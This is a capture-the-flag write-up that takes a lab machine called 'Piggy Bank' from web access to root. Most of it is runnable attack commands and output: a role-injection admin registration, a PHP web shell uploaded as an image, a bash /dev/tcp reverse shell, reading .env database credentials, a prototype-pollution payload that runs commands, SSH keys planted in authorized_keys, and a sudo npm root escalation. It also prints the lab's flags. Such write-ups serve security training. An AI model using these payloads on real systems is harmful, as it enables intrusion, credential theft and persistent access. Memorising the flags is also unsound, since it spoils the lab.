# Piggy Bank — Full Exploitation Flow (Web → Root)

## 1. Initial Recon

Start with directory enumeration:

```bash
feroxbuster -u http://10.100.10.108/ -w /usr/share/wordlists/dirb/common.txt
```

Interesting findings:

```
/admin
/dashboard
/api/login
/api/register
/api/me
/api/admin/upload-logo
```

## 2. Register Normal User

Create an account from the web UI or API.

After login, inspect cookies:

```
token=<UUID>
```

Test token:

```bash
curl -H "Authorization: Bearer <TOKEN>" \
http://10.100.10.108/api/me
```

Response:

```json
{
  "user": {
    "role":"user"
  }
}
```

## 3. Discover Broken Registration Logic

Tried adding `"role":"admin"` during registration:

```bash
curl -i -X POST http://10.100.10.108/api/register \
-H "Content-Type: application/json" \
-d '{
  "username":"admin2",
  "email":"admin2@test.com",
  "password":"Password123!",
  "role":"admin"
}'
```

Success:

```
"role":"admin"
```

This creates an admin user directly.

## 4. Abuse Admin File Upload → RCE

Admin endpoint:

```
/api/admin/upload-logo
```

Upload PHP webshell:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

Upload:

```bash
curl -X POST \
-H "Authorization: Bearer <ADMIN_TOKEN>" \
-F "logo=@shell.php;type=image/png" \
http://10.100.10.108/api/admin/upload-logo
```

Response:

```json
{"logo_path":"/uploads/shell.php"}
```

Command execution:

```
http://10.100.10.108/uploads/shell.php?cmd=id
```

Result:

```
uid=33(www-data)
```

## 5. Reverse Shell

Listener:

```bash
nc -lvnp 4444
```

Trigger:

```
http://10.100.10.108/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/4444+0>%261'
```

Shell obtained:

```
www-data
```

## 6. Enumeration

Found interesting directories:

```bash
find / -name ".env" 2>/dev/null
```

Results:

```
/var/www/piggybank-api/.env
/var/www/piggybank-internal-api/.env
```

Read configs:

```bash
cat /var/www/piggybank-internal-api/.env
```

Database creds:

```
DB_USER=piggybank_user
DB_PASSWORD=piggybank_pass_2026
```

## 7. Read Internal API Source Code

Read source:

```bash
cat /var/www/piggybank-internal-api/server.js
```

Critical discovery:

```
"description": "vulnerable to prototype pollution → RCE"
```

Vulnerable logic:

```
merge(target, source)
```

And:

```javascript
if (config.isAdmin && config.healthCheckScript.trim()) {
    execSync(config.healthCheckScript)
}
```

## 8. Exploit Prototype Pollution

Test command execution:

```bash
curl -s -X POST http://127.0.0.1:5001/users \
-H "Content-Type: application/json" \
-d '{
  "username":"pp5",
  "email":"pp5@test.com",
  "password":"x",
  "__proto__":{
    "isAdmin":true,
    "healthCheckScript":"id > /tmp/internal_id"
  }
}'
```

Verify:

```bash
cat /tmp/internal_id
```

Result:

```
uid=1003(piggyadmin)
```

Code execution as piggyadmin.

## 9. SSH Persistence

Generate key:

```bash
ssh-keygen -t rsa -f ~/.ssh/piggy_lab -N ""
```

Inject public key:

```bash
curl -s -X POST http://127.0.0.1:5001/users \
-H "Content-Type: application/json" \
-d '{
  "username":"pp8",
  "email":"pp8@test.com",
  "password":"x",
  "__proto__":{
    "isAdmin":true,
    "healthCheckScript":"mkdir -p /home/piggyadmin/.ssh && echo '\''PUBLIC_KEY'\'' >> /home/piggyadmin/.ssh/authorized_keys && chmod 700 /home/piggyadmin/.ssh && chmod 600 /home/piggyadmin/.ssh/authorized_keys"
  }
}'
```

SSH:

```bash
ssh -i ~/.ssh/piggy_lab piggyadmin@10.100.10.108
```

## 10. User Flag

```bash
cat /home/piggyadmin/user.txt
```

Flag:

```
60fc5426bcd61711a8c731cf950ec4ec
```

## 11. Privilege Escalation

Enumeration:

```bash
sudo -l
```

Result:

```
(ALL) NOPASSWD: /usr/bin/npm
```

GTFOBins escalation:

```bash
sudo npm exec -- /bin/bash
```

Root shell obtained.

## 12. Root Flag

```bash
cd /root
cat root.txt
```

Flag:

```
6cd0b31c576a98fabc42dbe277d4ec49
```

---

## Vulnerabilities Used

| Stage | Vulnerability |
|-------|---------------|
| Registration | Broken Access Control |
| Upload Feature | Arbitrary File Upload |
| Upload Execution | RCE via PHP |
| Internal API | Prototype Pollution |
| Privesc | Misconfigured sudo (npm) |

## Key Lessons

- Always inspect API endpoints manually.
- Never trust frontend restrictions.
- File upload validation must verify content, not MIME only.
- Source code enumeration is often the pivot point.
- Prototype pollution can become RCE when merged objects affect security logic.
- GTFOBins is essential for Linux privilege escalation.
